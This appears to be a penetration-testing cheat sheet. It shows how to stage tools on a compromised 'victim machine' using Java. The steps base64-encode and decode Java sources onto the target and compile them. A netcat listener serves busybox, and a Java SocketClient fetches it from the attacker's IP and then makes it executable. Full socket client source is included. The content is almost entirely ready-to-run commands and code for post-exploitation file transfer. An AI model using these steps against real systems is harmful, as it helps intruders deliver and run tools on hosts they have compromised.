## File transfer with Java

#### 1) Encode the socket client as Base64

    base64 SocketClient.java

#### 2) Transfer the file by decoding the Base64 on the victim machine

    echo "BASE64ENCODED" | base64 -d > SocketClient.java 

#### 3) Compile

    javac SocketClient.java 

#### 4) Same steps with File Permissions

    base64 FilePermissions.java

#### 5)  Transfer to the victim machine

    echo "BASE64ENCODED" | base64 -d > FilePermissions.java 

#### 6) Compile

    javac FilePermissions.java

#### 7) Transfer busybox (example)

    nc -lvnp 5555 < busybox

#### 8) Run the socket client from the victim machine to retrieve the binary from the attacker machine

    java SocketClient OUR_IP 5555 > busybox 

#### 9) Give busybox permissions to execute

    java FilePermissions 

## Java Files

### SocketClient.java

    import java.io.*;
    import java.net.*;
    public class SocketClient {
    public static void main(String args[]) {
          Socket socket = null;
          DataInputStream inputStream = null;
    try {
             socket = new Socket(args[0], Integer.valueOf(args[1]));
             inputStream = new DataInputStream(socket.getInputStream());
          }
          catch (Exception e) {
             System.err.println(e);
          }
    while (true) {
             try {
                byte[] bytes = new byte[4096];
                int length = inputStream.read(bytes);
                if (length < 0) {
                   break;
                }
                System.out.write(bytes, 0, length);
             }
             catch(Exception e) {
                System.err.println(e);
                break;
             }
          }
    try {
             inputStream.close();
             socket.close();
          }
          catch(IOException e) {
             System.err.println(e);
          }
       }
    }
